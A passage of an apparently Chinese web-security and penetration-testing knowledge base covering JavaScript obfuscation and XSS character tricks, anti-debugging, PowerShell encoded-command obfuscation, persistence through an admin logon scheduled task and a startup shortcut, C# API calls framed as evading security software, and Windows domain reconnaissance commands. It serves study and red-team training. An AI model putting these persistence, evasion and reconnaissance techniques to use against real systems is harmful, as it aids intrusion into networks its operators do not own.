<h5>Higher numbers<a class="headerlink" href="#higher-numbers" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">10</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">+([+!+[]]+[+[]])</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">11</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">+([+!+[]]+[+!+[]])</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">100</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">+([+!+[]]+[+[]]+(+[]))</span></code></li>
</ul>
</div>
<div class="section" id="string-alphabet">
<h5>String alphabet<a class="headerlink" href="#string-alphabet" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">'a'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+![])[+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'d'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+[][[]])[+!+[]+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'e'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+!+[])[+!+[]+!+[]+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'f'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+![])[+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'i'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+[][[]])[+!+[]+!+[]+!+[]+!+[]+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'l'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+![])[+!+[]+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'n'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+[][[]])[+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'r'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+!+[])[+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'s'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+![])[+!+[]+!+[]+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'t'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+!+[])[+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'u'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">([]+!+[])[+!+[]+!+[]]</span></code></li>
</ul>
</div>
</div>
<span id="document-language/javascript/trick"></span><div class="section" id="trick">
<h4>Trick<a class="headerlink" href="#trick" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>通过正则表达式构造特定字符<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="nx">empty</span> <span class="o">=</span> <span class="nb">RegExp</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">flags</span>
<span class="nx">regSource</span> <span class="o">=</span> <span class="p">{</span> <span class="p">...</span><span class="nb">RegExp</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">source</span> <span class="p">}</span>
<span class="nx">regSource</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">shift</span>
<span class="nx">regSource</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">4</span>
<span class="nx">left</span>  <span class="o">=</span> <span class="nx">regSource</span> <span class="o">+</span> <span class="nx">empty</span> <span class="c1">// 生成 (</span>
<span class="nx">quest</span> <span class="o">=</span> <span class="nx">regSource</span> <span class="o">+</span> <span class="nx">empty</span> <span class="c1">// 生成 ?</span>
<span class="nx">colon</span> <span class="o">=</span> <span class="nx">regSource</span> <span class="o">+</span> <span class="nx">empty</span> <span class="c1">// 生成 :</span>
<span class="nx">right</span> <span class="o">=</span> <span class="nx">regSource</span> <span class="o">+</span> <span class="nx">empty</span> <span class="c1">// 生成 )</span>

<span class="nx">xss</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nx">xss</span><span class="p">.</span><span class="nx">source</span> <span class="o">=</span> <span class="s1">&#39;xss&#39;</span>
<span class="nx">xss</span><span class="p">.</span><span class="nx">flags</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span>
<span class="nx">xss</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span> <span class="nb">RegExp</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span>
<span class="nx">xss</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span> <span class="c1">// =&gt; /xss/a</span>
</pre></div>
</div>
</div>
</div>
<span id="document-language/javascript/misc"></span><div class="section" id="id1">
<h4>其他<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>命令执行<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>Node.js中child_process.exec命令调用的是 <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> ，故可以直接使用该命令执行shell</p>
</div>
<div class="section" id="id3">
<h5>反调试技巧<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>函数重定义 <code class="docutils literal notranslate"><span class="pre">console.log</span> <span class="pre">=</span> <span class="pre">function(a){}</span></code></li>
<li>定时断点 <code class="docutils literal notranslate"><span class="pre">setInterval(function(){debugger},</span> <span class="pre">1000);</span></code></li>
</ul>
</div>
<div class="section" id="id4">
<h5>对象拷贝<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>JavaScript中的对象拷贝分为浅拷贝和深拷贝。</p>
<p>浅拷贝对一个对象进行拷贝时，仅仅拷贝对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。其中一个对象的改变都会影响到另一个对象。</p>
<p>深拷贝拷贝一个对象时，不仅仅把对象的引用进行复制，还把该对象引用的值也一起拷贝。源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。</p>
<p>深拷贝可以基于 <code class="docutils literal notranslate"><span class="pre">for-in</span></code> / <code class="docutils literal notranslate"><span class="pre">object.assign()</span></code> / 拓展运算符 <code class="docutils literal notranslate"><span class="pre">...</span></code> / <code class="docutils literal notranslate"><span class="pre">JSON.parse(JSON.stringify())</span></code> 等方式实现。其中前三种方式只对第一层做深拷贝，若对象结构较为复杂，则需要用递归的方式对更深的层次进行拷贝。</p>
</div>
<div class="section" id="sink">
<h5>常见Sink<a class="headerlink" href="#sink" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>child_process</li>
<li>eval</li>
<li>exec</li>
<li>execSync</li>
</ul>
</div>
</div>
<span id="document-language/javascript/ref"></span><div class="section" id="id1">
<h4>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://www.freebuf.com/articles/system/163579.html">JavaScript反调试技巧</a></li>
<li><a class="reference external" href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.3.4.5">ECMAScript Language Specification</a></li>
<li><a class="reference external" href="https://www.zhihu.com/question/34183746?sort=created">js prototype</a></li>
<li><a class="reference external" href="https://github.com/scscms/guardJs/">javascript防劫持</a></li>
<li><a class="reference external" href="http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3.html">XSS 前端防火墙</a></li>
<li><a class="reference external" href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">exploiting node js deserialization bug for remote code execution</a></li>
<li><a class="reference external" href="https://github.com/HoLyVieR/prototype-pollution-nsec18/">Prototype pollution attack</a> Content released at NorthSec 2018 on prototype pollution</li>
</ul>
</div>
</div>
</div>
<span id="document-language/golang"></span><div class="section" id="golang">
<h3>Golang<a class="headerlink" href="#golang" title="永久链接至标题">¶</a></h3>
<div class="section" id="golang-runtime">
<h4>Golang Runtime<a class="headerlink" href="#golang-runtime" title="永久链接至标题">¶</a></h4>
<p>Go中的线程被称为Goroutine或G，内核线程被称为M。这些G被调度到M上，即所谓的G：M线程模型，或更常用的M：N线程模型，用户空间线程或green线程模型。</p>
</div>
<div class="section" id="id1">
<h4>字符串处理<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Go 源代码始终为 UTF-8</li>
<li>代表 Unicode 码点的字节序列称为 <code class="docutils literal notranslate"><span class="pre">rune</span></code></li>
<li>Go 不保证字符串中的字符被规范化</li>
<li>字符串可以包含任意字节</li>
<li>字符串中不包含字节级转义符时，字符串始终包含有效的 UTF-8 序列</li>
</ul>
</div>
<div class="section" id="id2">
<h4>参考链接<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://blog.golang.org/strings">Strings, bytes, runes and characters in Go</a></li>
</ul>
</div>
</div>
<span id="document-language/ruby"></span><div class="section" id="ruby">
<h3>Ruby<a class="headerlink" href="#ruby" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.elttam.com.au/blog/ruby-deserialization/">ruby deserialization</a></li>
</ul>
</div>
</div>
<span id="document-language/asp"></span><div class="section" id="asp">
<h3>ASP<a class="headerlink" href="#asp" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>ASP是动态服务器页面(Active Server Page)，是微软开发的类似CGI脚本程序的一种应用，其网页文件的格式是 <code class="docutils literal notranslate"><span class="pre">.asp</span></code> 。</p>
</div>
<div class="section" id="id2">
<h4>参考链接<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.cnblogs.com/LittleHann/p/5016999.html">Deformity ASP/ASPX Webshell、Webshell Hidden Learning</a></li>
</ul>
</div>
</div>
<span id="document-language/powershell"></span><div class="section" id="powershell">
<h3>PowerShell<a class="headerlink" href="#powershell" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>执行策略<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略。</p>
<p>Restricted 策略可以执行单个的命令，但是不能执行脚本，Windows 8、 Windows Server 2012中默认使用该策略。</p>
<p>AllSigned 策略允许执行所有具有数字签名的脚本。</p>
<p>RemoteSigned 当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</p>
<p>Unrestricted 这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。</p>
<p>BypassBypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</p>
<p>UndefinedUndefined 表示没有设置脚本策略，会继承或使用默认的脚本策略。</p>
</div>
<div class="section" id="id2">
<h4>混淆<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-EC</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">-EncodedCommand</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">-EncodedComman</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">-EncodedComma</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">-EncodedComm</span></code></li>
</ul>
</div>
<div class="section" id="id3">
<h4>常见功能<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>计划任务<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<div class="code powershell highlight-default notranslate"><div class="highlight"><pre><span></span>$Action = New-ScheduledTaskAction -Execute &quot;calc.exe&quot;
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId &quot;BUILTIN\Administrators&quot; -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
Unregister-ScheduledTask -TaskName &quot;AtomicTask&quot; -confirm:$false
</pre></div>
</div>
</div>
<div class="section" id="id5">
<h5>创建链接<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<div class="code powershell highlight-default notranslate"><div class="highlight"><pre><span></span>$Shell = New-Object -ComObject (&quot;WScript.Shell&quot;)
$ShortCut = $Shell.CreateShortcut(&quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\test.lnk&quot;)
$ShortCut.TargetPath=&quot;cmd.exe&quot;
$ShortCut.WorkingDirectory = &quot;C:\Windows\System32&quot;;
$ShortCut.WindowStyle = 1;
$ShortCut.Description = &quot;test.&quot;;
$ShortCut.Save()
</pre></div>
</div>
</div>
<div class="section" id="id6">
<h5>编码<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<div class="code powershell highlight-default notranslate"><div class="highlight"><pre><span></span>$OriginalCommand = &#39;#{powershell_command}&#39;
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
</pre></div>
</div>
</div>
<div class="section" id="id7">
<h5>其他<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>别名</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">alias</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>下载文件</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">Invoke-WebRequest</span> <span class="pre">&quot;https://example.com/test.zip&quot;</span> <span class="pre">-OutFile</span> <span class="pre">&quot;$env:TEMP\test.zip&quot;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>解压缩</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">Expand-Archive</span> <span class="pre">$env:TEMP\test.zip</span> <span class="pre">$env:TEMP\test</span> <span class="pre">-Force</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>进程</dt>
<dd><ul class="first last">
<li>启动进程 <code class="docutils literal notranslate"><span class="pre">Start-Process</span> <span class="pre">calc</span></code></li>
<li>停止进程 <code class="docutils literal notranslate"><span class="pre">Stop-Process</span> <span class="pre">-ID</span> <span class="pre">$pid</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>文件</dt>
<dd><ul class="first last">
<li>新建文件 <code class="docutils literal notranslate"><span class="pre">New-Item</span> <span class="pre">#{file_path}</span> <span class="pre">-Force</span> <span class="pre">|</span> <span class="pre">Out-Null</span></code></li>
<li>设置文件内容 <code class="docutils literal notranslate"><span class="pre">Set-Content</span> <span class="pre">-Path</span> <span class="pre">#{file_path}</span> <span class="pre">-Value</span> <span class="pre">&quot;#{Content}&quot;</span></code></li>
<li>追加文件内容 <code class="docutils literal notranslate"><span class="pre">Add-Content</span> <span class="pre">-Path</span> <span class="pre">#{file_path}</span> <span class="pre">-Value</span> <span class="pre">&quot;#{Content}&quot;</span></code></li>
<li>复制文件 <code class="docutils literal notranslate"><span class="pre">Copy-Item</span> <span class="pre">src</span> <span class="pre">dst</span></code></li>
<li>删除文件 <code class="docutils literal notranslate"><span class="pre">Remove-Item</span> <span class="pre">#{outputfile}</span> <span class="pre">-Force</span> <span class="pre">-ErrorAction</span> <span class="pre">Ignore</span></code></li>
<li>子目录 <code class="docutils literal notranslate"><span class="pre">Get-ChildItem</span> <span class="pre">#{file_path}</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>服务</dt>
<dd><ul class="first last">
<li>获取服务 <code class="docutils literal notranslate"><span class="pre">Get-Service</span> <span class="pre">-Name</span> <span class="pre">&quot;#{service_name}&quot;</span></code></li>
<li>启动服务 <code class="docutils literal notranslate"><span class="pre">Start-Service</span> <span class="pre">-Name</span> <span class="pre">&quot;#{service_name}&quot;</span></code></li>
<li>停止服务 <code class="docutils literal notranslate"><span class="pre">Stop-Service</span> <span class="pre">-Name</span> <span class="pre">&quot;#{service_name}&quot;</span></code></li>
<li>删除服务 <code class="docutils literal notranslate"><span class="pre">Remove-Service</span> <span class="pre">-Name</span> <span class="pre">&quot;#{service_name}&quot;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>获取WMI支持 <code class="docutils literal notranslate"><span class="pre">Get-WmiObject</span> <span class="pre">-list</span></code></li>
</ul>
</div>
</div>
<div class="section" id="id8">
<h4>参考链接<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://docs.microsoft.com/zh-cn/powershell/">PowerShell 官方文档</a></li>
</ul>
</div>
</div>
<span id="document-language/shell"></span><div class="section" id="shell">
<h3>Shell<a class="headerlink" href="#shell" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。</p>
<p>Linux 包含多种 Shell ，常见的有：</p>
<ul class="simple">
<li>Bourne Shell（ATT的Bourne开发，名为sh）</li>
<li>Bourne Again Shell（/bin/bash）</li>
<li>C Shell（Bill Joy开发，名为csh）</li>
<li>K Shell（ATT的David G.koun开发，名为ksh）</li>
<li>Z Shell（Paul Falstad开发，名为zsh）</li>
</ul>
</div>
<div class="section" id="id2">
<h4>元字符<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>shell一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的Shell支持的元字符可能会不相同。</p>
<p>常见的元字符如下：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">IFS</span></code> 由 &lt;space&gt; 或 &lt;tab&gt; 或 &lt;enter&gt; 三者之一组成</li>
<li><code class="docutils literal notranslate"><span class="pre">CR</span></code> 由 &lt;enter&gt; 产生。</li>
<li><code class="docutils literal notranslate"><span class="pre">=</span></code> 设定变量</li>
<li><code class="docutils literal notranslate"><span class="pre">$</span></code> 作变量或运算替换</li>
<li><code class="docutils literal notranslate"><span class="pre">&gt;</span></code> 重定向 stdout</li>
<li><code class="docutils literal notranslate"><span class="pre">&gt;&gt;</span></code> 追加到文件</li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;</span></code> 重定向 stdin</li>
<li><code class="docutils literal notranslate"><span class="pre">|</span></code> 命令管道</li>
<li><code class="docutils literal notranslate"><span class="pre">&amp;</span></code> 后台执行命令</li>
<li><code class="docutils literal notranslate"><span class="pre">;</span></code> 在前一个命令结束后，执行下一个命令</li>
<li><code class="docutils literal notranslate"><span class="pre">&amp;&amp;</span></code> 在前一个命令未报错执行后，执行下一个命令</li>
<li><code class="docutils literal notranslate"><span class="pre">||</span></code> 在前一个命令执行报错后，执行下一个命令</li>
<li><code class="docutils literal notranslate"><span class="pre">'</span></code> 在单引号内的命令会保留原来的值</li>
<li><code class="docutils literal notranslate"><span class="pre">&quot;</span></code> 在双引号内的命令会允许变量替换</li>
<li>`` ` `` 在反引号内的内容会当成命令执行并替换</li>
<li><code class="docutils literal notranslate"><span class="pre">()</span></code> 在子Shell中执行命令</li>
<li><code class="docutils literal notranslate"><span class="pre">{}</span></code> 在当前Shell中执行命令</li>
<li><code class="docutils literal notranslate"><span class="pre">~</span></code> 当前用户的主目录</li>
<li><code class="docutils literal notranslate"><span class="pre">!number</span></code> 执行历史命令，如 <code class="docutils literal notranslate"><span class="pre">!1</span></code></li>
</ul>
</div>
<div class="section" id="id3">
<h4>通配符<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>除元字符外，通配符（wildcard）也是shell中的一种特殊字符。当shell在参数中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。</p>
<p>常见的通配符如下：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">*</span></code> 匹配 0 或多个字符</li>
<li><code class="docutils literal notranslate"><span class="pre">?</span></code> 匹配任意一个字符</li>
<li><code class="docutils literal notranslate"><span class="pre">[list]</span></code> 匹配 list 中的任意一个字符</li>
<li><code class="docutils literal notranslate"><span class="pre">[!list]</span></code> 匹配除 list 外的任意一个字符</li>
<li><code class="docutils literal notranslate"><span class="pre">[a-c]</span></code> 匹配 a-c 中的任意一个字符</li>
<li><code class="docutils literal notranslate"><span class="pre">{string1,string2,...}</span></code> 分别匹配其中字符串</li>
</ul>
</div>
</div>
<span id="document-language/csharp/index"></span><div class="section" id="csharp">
<h3>CSharp<a class="headerlink" href="#csharp" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-language/csharp/trick"></span><div class="section" id="id1">
<h4>利用技巧<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="p-invoke">
<h5>P/Invoke<a class="headerlink" href="#p-invoke" title="永久链接至标题">¶</a></h5>
<p>Platform Invoke (P/Invoke) 提供了C#访问DLL中数据结构、回调、函数的能力。基本的使用方式如官方 <a class="reference external" href="https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">Platform Invoke</a> 文档中所示。利用P/Invoke的能力，C#程序可以较为容易的调用标准的Windows API。</p>
<div class="code csharp highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">using</span> <span class="n">System</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Runtime</span><span class="o">.</span><span class="n">InteropServices</span><span class="p">;</span>

<span class="n">public</span> <span class="k">class</span> <span class="nc">Program</span>
<span class="p">{</span>
    <span class="o">//</span> <span class="n">Import</span> <span class="n">user32</span><span class="o">.</span><span class="n">dll</span> <span class="p">(</span><span class="n">containing</span> <span class="n">the</span> <span class="n">function</span> <span class="n">we</span> <span class="n">need</span><span class="p">)</span> <span class="ow">and</span> <span class="n">define</span>
    <span class="o">//</span> <span class="n">the</span> <span class="n">method</span> <span class="n">corresponding</span> <span class="n">to</span> <span class="n">the</span> <span class="n">native</span> <span class="n">function</span><span class="o">.</span>
    <span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s2">&quot;user32.dll&quot;</span><span class="p">,</span> <span class="n">CharSet</span> <span class="o">=</span> <span class="n">CharSet</span><span class="o">.</span><span class="n">Unicode</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="o">=</span> <span class="n">true</span><span class="p">)]</span>
    <span class="n">private</span> <span class="n">static</span> <span class="n">extern</span> <span class="nb">int</span> <span class="n">MessageBox</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">,</span> <span class="n">string</span> <span class="n">lpText</span><span class="p">,</span> <span class="n">string</span> <span class="n">lpCaption</span><span class="p">,</span> <span class="n">uint</span> <span class="n">uType</span><span class="p">);</span>

    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="o">//</span> <span class="n">Invoke</span> <span class="n">the</span> <span class="n">function</span> <span class="k">as</span> <span class="n">a</span> <span class="n">regular</span> <span class="n">managed</span> <span class="n">method</span><span class="o">.</span>
        <span class="n">MessageBox</span><span class="p">(</span><span class="n">IntPtr</span><span class="o">.</span><span class="n">Zero</span><span class="p">,</span> <span class="s2">&quot;Command-line message box&quot;</span><span class="p">,</span> <span class="s2">&quot;Attention!&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
<p>P/Invoke的缺点在于引用了的API调用会最后出现在可执行文件的IAT中，使得一些敏感的行为容易被防护软件所注意。同时一些敏感的API可能是被防护软件所监控的，通过这种方式进行的API调用也容易被防护软件拦截。</p>
</div>
<div class="section" id="d-invoke">
<h5>D/Invoke<a class="headerlink" href="#d-invoke" title="永久链接至标题">¶</a></h5>
<p>在P/Invoke的基础上，有研究人员提出了基于 <a class="reference external" href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/">Delegates</a> 机制的D/Invoke，通过更隐蔽的方式来调用所需的API。</p>
</div>
</div>
<span id="document-language/csharp/ref"></span><div class="section" id="id1">
<h4>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="net">
<h5>.Net<a class="headerlink" href="#net" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://docs.microsoft.com/en-us/dotnet/fundamentals/">.NET documentation</a></li>
</ul>
</div>
<div class="section" id="id2">
<h5>利用技巧<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://thewover.github.io/Dynamic-Invoke/">Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
<span id="document-intranet/index"></span><div class="section" id="id1">
<h2>内网渗透<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-intranet/windows"></span><div class="section" id="windows">
<h3>信息收集 - Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>基本命令<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>主机名 <code class="docutils literal notranslate"><span class="pre">hostname</span></code></li>
<li>查询所有计算机名称 <code class="docutils literal notranslate"><span class="pre">dsquery</span> <span class="pre">computer</span></code></li>
<li><dl class="first docutils">
<dt>查看配置及补丁信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">systeminfo</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">qfe</span> <span class="pre">get</span> <span class="pre">description,installedOn</span> <span class="pre">/format:csv</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>查看版本 <code class="docutils literal notranslate"><span class="pre">ver</span></code></li>
<li><dl class="first docutils">
<dt>进程信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">tasklist</span> <span class="pre">/svc</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">process</span> <span class="pre">get</span> <span class="pre">caption,executablepath,commandline</span> <span class="pre">/format:csv</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">get-process</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>查看所有环境变量 <code class="docutils literal notranslate"><span class="pre">set</span></code></li>
<li>查看计划任务 <code class="docutils literal notranslate"><span class="pre">schtasks</span> <span class="pre">/QUERY</span> <span class="pre">/fo</span> <span class="pre">LIST</span> <span class="pre">/v</span></code></li>
<li>查看安装驱动 <code class="docutils literal notranslate"><span class="pre">DRIVERQUERY</span></code></li>
<li><dl class="first docutils">
<dt>查看操作系统信息</dt>
<dd><ul class="first last">
<li>架构 <code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">os</span> <span class="pre">get</span> <span class="pre">osarchitecture</span></code></li>
<li>系统名 <code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">os</span> <span class="pre">get</span> <span class="pre">caption</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>查看逻辑盘 <code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">logicaldisk</span> <span class="pre">get</span> <span class="pre">caption</span></code></li>
<li>查看安装的软件信息 <code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">product</span> <span class="pre">get</span> <span class="pre">name,version</span></code></li>
<li><dl class="first docutils">
<dt>查看服务信息</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">service</span> <span class="pre">list</span> <span class="pre">brief</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">sc</span> <span class="pre">query</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">Get-WmiObject</span> <span class="pre">win32_service</span> <span class="pre">|</span> <span class="pre">select</span> <span class="pre">PathName</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id2">
<h4>域信息<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>获取当前组的计算机名 <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">view</span></code></li>
<li>网络发现  <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">view</span> <span class="pre">/all</span></code></li>
<li>查看所有域 <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">view</span> <span class="pre">/domain</span></code></li>
<li>域森林、域树信息</li>
<li>域信任信息 <code class="docutils literal notranslate"><span class="pre">nltest</span> <span class="pre">/domain_trusts</span></code></li>
<li>定位域控 <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">time</span> <span class="pre">/domain</span></code></li>
<li>查看域中的用户名 <code class="docutils literal notranslate"><span class="pre">dsquery</span> <span class="pre">user</span></code></li>
<li>查询域组名称 <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">group</span> <span class="pre">/domain</span></code></li>
<li>查询域管理员 <code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">group</span> <span class="pre">&quot;Domain</span> <span class="pre">Admins&quot;</span> <span class="pre">/domain</span></code></li>
<li><dl class="first docutils">
<dt>域控信息</dt>
